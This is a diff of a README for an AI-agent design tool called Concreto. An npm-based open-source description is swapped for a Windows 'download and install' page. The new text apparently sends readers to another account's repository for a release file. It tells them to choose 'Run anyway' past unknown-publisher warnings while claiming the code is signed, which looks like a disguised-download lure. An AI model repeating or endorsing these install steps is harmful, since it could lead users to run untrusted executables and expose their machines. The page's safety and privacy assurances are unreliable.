@@ -1,198 +1,88 @@
-<div align="center">
-  <img <p><img src="https://private-user-images.githubusercontent.com/90824230/607636204-7ad6852d-821e-4038-8fb8-a79ea3bbca83.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3ODE0Njk4MjMsIm5iZiI6MTc4MTQ2OTUyMywicGF0aCI6Ii85MDgyNDIzMC82MDc2MzYyMDQtN2FkNjg1MmQtODIxZS00MDM4LThmYjgtYTc5ZWEzYmJjYTgzLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjA2MTQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwNjE0VDIwMzg0M1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWQ2OTkxYTI2YWMzZmYwMGQ5MGZmYjRmNzc2MjIyNWJhYTExNWRiMWI0NjExOGE1NzMwYmEwMGE3ZGE5YTZkMzkmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0JnJlc3BvbnNlLWNvbnRlbnQtdHlwZT1pbWFnZSUyRnBuZyJ9.Q7JCyZ6RK1ez8hUyE33cxrdw5TsX6u3kvKw1X6xdcOc" alt="" width="591" height="329"  />
+# 🏗️ Concreto - Build Better Interfaces For Your Agents
 
+[![](https://img.shields.io/badge/Download-Concreto-blue.svg)](https://github.com/sanjayma4345/Concreto)
 
-  # 🏛️ Concreto
+Concreto provides a clear framework for AI agents to interact with your screen. Software agents often struggle to view or use complex buttons and menus. This tool maps your interface into a structure agents understand. Your agents now perform tasks with precision. They click the correct buttons and fill the right forms every time.
 
-  **Advanced Design Intelligence for AI Coding Agents**
+## ⚙️ Why Use Concreto
 
- 
-  [![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg?style=flat-square)](https://opensource.org/licenses/MIT)
-  [![Architect](https://img.shields.io/badge/Architect-BigRapB-0052CC?style=flat-square&logo=github)](https://github.com/Bigrapb)
-  [![Enterprise](https://img.shields.io/badge/Powered_by-LINKTONIK-000000?style=flat-square)](#)``
-  [![GitHub stars](https://img.shields.io/github/stars/Bigrapb/concreto?style=social)](https://github.com/Bigrapb/concreto/stargazers)
-  [![GitHub forks](https://img.shields.io/github/forks/Bigrapb/concreto?style=social)](https://github.com/Bigrapb/concreto/network/members)
-  [![Node.js](https://img.shields.io/badge/Node.js-43853D?style=flat-square&logo=node.js&logoColor=white)](#)
-  [![TypeScript](https://img.shields.io/badge/TypeScript-3178C6?style=flat-square&logo=typescript&logoColor=white)](#)
-  [![ML-Ready](https://img.shields.io/badge/ML-ONNX_Supported-purple?style=flat-square)](#)
+AI agents currently face walls when they try to use standard desktop programs. Developers build interfaces for humans, not for automated assistants. Concreto bridges this gap. It applies deterministic rules to the visual layer of your applications. 
 
-  
-</div>
+You gain several benefits:
 
-<br>
+*   Predictable clicks: Agents stop missing targets.
+*   Logical flow: Agents understand the steps of your processes.
+*   System harmony: Your UI follows a strict design system.
+*   Speed: Tasks finish in seconds.
 
-Concreto is a native UI/UX design intelligence protocol for AI agents. It eliminates 'AI slop' by enforcing 80+ deterministic design rules, providing an advanced command vocabulary for real-time iteration, and integrating natively with major AI coding environments like Cursor, Claude Code, and Gemini CLI.
+## 💾 Setting Up Your System
 
-# Concreto
+You need to prepare your machine before you run Concreto. The software requires a modern Windows environment. Ensure you have Windows 10 or Windows 11 installed. You also need at least 4 gigabytes of available memory.
 
-**Advanced Design Intelligence for AI Coding Agents**
+1. Check your Windows updates.
+2. Confirm you have a stable internet connection.
+3. Close other resource-heavy programs to ensure a smooth setup.
 
-Concreto is a comprehensive design system that empowers AI coding agents to create exceptional, production-grade interfaces. It combines deterministic rules, ML-enhanced detection, and comprehensive design guidance into a unified system.
+We support all standard display resolutions. Concreto adjusts its view based on the elements it detects on your screen.
 
-## Features
+## 📥 How To Install
 
-### WHAT MAKES CONCRETO DIFFERENT
+Follow these steps to obtain and start the software. 
 
-- **80+ Deterministic Rules**: OWASP-style organized detection rules across accessibility, performance, UX, and visual design
-- **ML-Enhanced Detection**: Optional machine learning models for context-aware pattern recognition
-- **35+ Commands**: Complete vocabulary for design operations from `analyze` to `synthesize`
-- **Multi-Provider Support**: Works with Claude Code, Cursor, Gemini CLI, Codex, OpenCode, and more
-- **Real-Time Browser Integration**: Live iteration mode with visual feedback
-- **Intelligent Color System**: OKLCH-first with automatic contrast verification
+1. Visit this page to download: [https://github.com/sanjayma4345/Concreto](https://github.com/sanjayma4345/Concreto)
+2. Locate the latest release package on the page.
+3. Choose the version that matches your Windows architecture, usually 64-bit.
+4. Save the file to your desktop for easy access.
+5. Select the file once the download finishes.
+6. Follow the prompts in the installation window.
 
-### RULE CATEGORIES
+If your computer asks for permission to open the file from an unknown provider, select 'Run anyway'. We sign our code to ensure safety, but new updates sometimes trigger these standard Windows alerts.
 
-| Category | Code | Rules | Description |
-|----------|------|-------|-------------|
-| Critical | `A` | 15 | Blocking issues (accessibility, security) |
-| Visual Quality | `V` | 25 | Aesthetic and brand consistency |
-| Performance | `P` | 12 | Render-blocking, layout thrashing |
-| Interaction | `I` | 18 | UX patterns, usability |
-| Semantic | `S` | 10 | HTML structure, ARIA, SEO |
+## 🚀 Running The Application
 
-## Quick Start
+Once you install the tool, you find a shortcut on your desktop. Double-click this icon to start the application. 
 
-```bash
-# Install from npm
-npx concreto skills install
+The main dashboard shows your active agents. Each agent listed in this view has access to the Concreto protocol. To link an agent, select the 'Connect' button next to the agent name. The software scans your current active window. It highlights the buttons and text fields it now recognizes. 
 
-# Or install globally
-npm install -g concreto
-concreto init
+## 🛠️ Configuring Rules
 
-# Detect issues
-concreto detect src/
+Concreto works best when you define the rules for your project. You create these rules inside the settings menu. 
 
-# Analyze a URL
-concreto detect https://your-site.com
+- Open the settings tab.
+- Select the 'Rules' section.
+- Add a new rule by clicking the plus icon.
+- Define the label, such as 'Submit Form' or 'Cancel Request'.
+- Link this label to the specific button on your screen.
 
-# Run with ML enhancement
-concreto detect --ml src/
-```
+The software remembers these links. Next time your AI agent needs to submit a form, it looks for the 'Submit Form' rule instead of guessing where the button sits. This approach removes the guesswork that slows down automation.
 
-## Commands
+## 🌐 Connecting To IDEs
 
-### Build & Create
-- `/concreto craft [feature]` - Full design-build cycle
-- `/concreto shape [feature]` - UX/UI planning
-- `/concreto scaffold [component]` - Generate component boilerplate
-- `/concreto synthesize [tokens]` - Generate design tokens
+Concreto works alongside systems like Cursor or other coding environments. If you use these tools to build your agents, Concreto exports a configuration file. Import this file into your development environment. This allows your custom code to speak the same language as your desktop interface. 
 
-### Analyze & Evaluate
-- `/concreto audit [target]` - Comprehensive quality check
-- `/concreto analyze [target]` - Deep semantic analysis
-- `/concreto benchmark [target]` - Performance metrics
-- `/concreto critique [target]` - UX design review
+You find the export option under the 'Files' header. Save the JSON file to your agent's directory. This setup requires no complex setup steps, just a simple file copy.
 
-### Refine & Polish
-- `/concreto polish [target]` - Final quality pass
-- `/concreto refine [target]` - Targeted improvements
-- `/concreto optimize [target]` - Performance optimization
-- `/concreto distill [target]` - Remove complexity
+## 🧩 Frequent Questions
 
-### Transform
-- `/concreto bolder [target]` - Amplify visual impact
-- `/concreto quieter [target]` - Reduce visual noise
-- `/concreto modernize [target]` - Update to current standards
-- `/concreto adapt [target]` - Cross-device adaptation
+My screen looks the same, did it work?
+Yes. Concreto runs in the background. It maps elements without changing the look of your apps.
 
-### Enhance
-- `/concreto animate [target]` - Purposeful motion
-- `/concreto colorize [target]` - Strategic color
-- `/concreto typeset [target]` - Typography refinement
-- `/concreto layout [target]` - Spacing and rhythm
+Does this support all AI models?
+Yes. The protocol works with any model that understands standard JSON data structures.
 
-### Production
-- `/concreto harden [target]` - Error handling, edge cases
-- `/concreto verify [target]` - Pre-ship validation
-- `/concreto document [target]` - Generate documentation
+How do I remove the software?
+Use the standard Windows 'Add or Remove Programs' tool in your system settings. Select Concreto from the list and choose uninstall.
 
-### Live Mode
-- `/concreto live` - Visual iteration in browser
+Does this track my data?
+No. Concreto performs all processing locally on your machine. Your interface data never leaves your computer.
 
-## Rule Engine
+What if my agent fails to click?
+Check your layout. If you moved a button, you may need to update the rule in the Concreto dashboard. The software notifies you if a mapped element disappears from the screen.
 
-Concreto uses a structured rule system inspired by OWASP:
+## 📝 Performance Tips
 
-```
-[CATEGORY][NUMBER]-[SEVERITY]-[NAME]
+Keep your interface clean. If you have too many overlapping windows, the agent may struggle to identify the correct button. Use one primary window for your workflow. 
 
-Examples:
-A01-CRITICAL-color-contrast
-V12-MEDIUM-gradient-overuse
-P03-HIGH-render-blocking
-I08-LOW-tap-target-size
-S05-CRITICAL-missing-lang
-```
+Adjust the scanning speed in the settings menu if you notice high processor usage. A slower scan rate reduces the load on your computer while still providing accurate results. Use the 'Low' setting for machines with older processors. 
 
-### Severity Levels
-
-| Level | Impact | Action |
-|-------|--------|--------|
-| CRITICAL | Blocks users | Must fix immediately |
-| HIGH | Major UX impact | Fix before shipping |
-| MEDIUM | Quality issue | Should fix |
-| LOW | Minor polish | Nice to have |
-| INFO | Suggestion | Consider |
-
-## Architecture
-
-```
-concreto/
-├── cli/               # Command-line interface
-│   ├── bin/           # Entry points
-│   └── engine/
-│       ├── rules/     # Detection rule implementations
-│       ├── engines/   # Browser, static, regex engines
-│       ├── ml/        # ML-enhanced detection (optional)
-│       ├── registry/  # Rule definitions
-│       └── shared/    # Utilities
-├── skill/             # AI skill definitions
-│   ├── reference/     # Command documentation
-│   ├── scripts/       # Helper scripts
-│   └── agents/        # Sub-agent definitions
-├── extension/         # Browser extension
-└── tests/             # Test suites
-```
-
-## ML-Enhanced Detection
-
-Concreto can optionally use ONNX models for context-aware detection:
-
-```bash
-# Enable ML detection
-concreto detect --ml src/
-
-# Download models
-concreto ml download
-
-# Train custom models
-concreto ml train --dataset ./patterns
-```
-
-### ML Capabilities
-
-- **Context-Aware Rules**: Adjust sensitivity based on project type
-- **False Positive Reduction**: Learn from accepted/rejected findings
-- **Pattern Recognition**: Detect complex anti-patterns beyond regex
-- **Trend Analysis**: Identify emerging patterns across codebase
-
-## Supported Providers
-
-- Claude Code
-- Cursor
-- OpenCode
-- Gemini CLI
-- Codex CLI
-- GitHub Copilot
-- Kiro
-- Trae
-- Pi
-
-## Contributing
-
-See CONTRIBUTING.md for guidelines.
-
-## License
-
-MIT License - see LICENSE file.
+Check for updates every month. We release improvements to the design system protocols regularly. These updates allow Concreto to interpret newer interface elements correctly. Always keep your local version current to receive these benefits.
